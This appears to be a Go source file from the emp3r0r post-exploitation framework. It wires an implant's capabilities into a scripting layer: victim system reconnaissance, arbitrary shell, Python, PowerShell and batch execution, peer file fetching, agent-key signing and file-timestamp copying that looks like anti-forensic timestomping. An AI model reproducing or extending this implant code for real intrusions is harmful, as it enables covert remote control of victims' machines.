package agentutils

import (
	"fmt"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/lib/script"
	"github.com/jm33-m0/emp3r0r/core/lib/sysinfo"
)

// FetchFileHandler is patched by c2transport package to break import cycle
var FetchFileHandler func(peer, fileToDownload, path, checksum string) ([]byte, error)

// AgentProxyImpl implements script.AgentProxy using agentutils functions.
type AgentProxyImpl struct{}

func (p *AgentProxyImpl) GatherSystemDetails() (map[string]any, error) {
	agent := GatherSystemDetails()
	if agent == nil {
		return nil, nil
	}
	m := map[string]any{
		"tag":              agent.Tag,
		"name":             agent.Name,
		"short_id":         agent.ShortID,
		"version":          agent.Version,
		"transport":        agent.Transport,
		"hostname":         agent.Hostname,
		"hardware":         agent.Hardware,
		"container":        agent.Container,
		"uptime":           agent.Uptime,
		"groups":           agent.Groups,
		"cpu":              agent.CPU,
		"gpu":              agent.GPU,
		"mem":              agent.Mem,
		"os":               agent.OS,
		"goos":             agent.GOOS,
		"kernel":           agent.Kernel,
		"arch":             agent.Arch,
		"from":             agent.From,
		"ips":              agent.IPs,
		"arp":              agent.ARP,
		"user":             agent.User,
		"has_root":         agent.HasRoot,
		"has_tor":          agent.HasTor,
		"has_internet":     agent.HasInternet,
		"ncsi_enabled":     agent.NCSIEnabled,
		"exes":             agent.Exes,
		"cwd":              agent.CWD,
		"uuid":             agent.UUID,
		"uuid_sig":         agent.UUIDSig,
		"public_key":       agent.PublicKey,
		"c2_host":          agent.C2Host,
		"mesh_route":       agent.MeshRoute,
		"p2p_relay_port":   agent.P2PRelayPort,
		"mesh_gossip_port": agent.MeshGossipPort,
		"files":            agent.Files,
	}
	if agent.Process != nil {
		m["process"] = map[string]any{
			"pid":     agent.Process.PID,
			"ppid":    agent.Process.PPID,
			"cmdline": agent.Process.Cmdline,
			"parent":  agent.Process.Parent,
		}
	}
	return m, nil
}

func (p *AgentProxyImpl) GetUptime() string {
	return GetUptime()
}

func (p *AgentProxyImpl) GetUserAndGroups() (string, string) {
	return GetUserAndGroups()
}

func (p *AgentProxyImpl) GetContainerName() string {
	return GetContainerName()
}

func (p *AgentProxyImpl) HasRoot() bool {
	return sysinfo.HasRoot()
}

func (p *AgentProxyImpl) ExecuteShell(scriptBytes []byte, argv, env []string) (string, error) {
	return ExecuteShell(scriptBytes, argv, env)
}

func (p *AgentProxyImpl) ExecutePython(scriptBytes []byte, argv, env []string) (string, error) {
	return ExecutePython(scriptBytes, argv, env)
}

func (p *AgentProxyImpl) ExecutePowerShell(scriptBytes []byte, argv, env []string) (string, error) {
	return ExecutePowerShell(scriptBytes, argv, env)
}

func (p *AgentProxyImpl) ExecuteBatch(scriptBytes []byte, argv, env []string) (string, error) {
	return ExecuteBatch(scriptBytes, argv, env)
}

func (p *AgentProxyImpl) SignWithAgentKey(data []byte) ([]byte, error) {
	return SignWithAgentKey(data)
}

func (p *AgentProxyImpl) GetTag() string {
	if common.RuntimeConfig != nil {
		return common.RuntimeConfig.AgentTag
	}
	return ""
}

func (p *AgentProxyImpl) GetUUID() string {
	if common.RuntimeConfig != nil {
		return common.RuntimeConfig.AgentUUID
	}
	return ""
}

func (p *AgentProxyImpl) TouchFile(path string) error {
	return TouchFile(path)
}

func (p *AgentProxyImpl) CopyFileTimes(src, dst string) error {
	return CopyFileTimes(src, dst)
}

func (p *AgentProxyImpl) FetchFile(peer, fileToDownload, path, checksum string) ([]byte, error) {
	if FetchFileHandler != nil {
		return FetchFileHandler(peer, fileToDownload, path, checksum)
	}
	return nil, fmt.Errorf("FetchFile handler not registered")
}

func init() {
	script.SetAgentProxy(&AgentProxyImpl{})
}
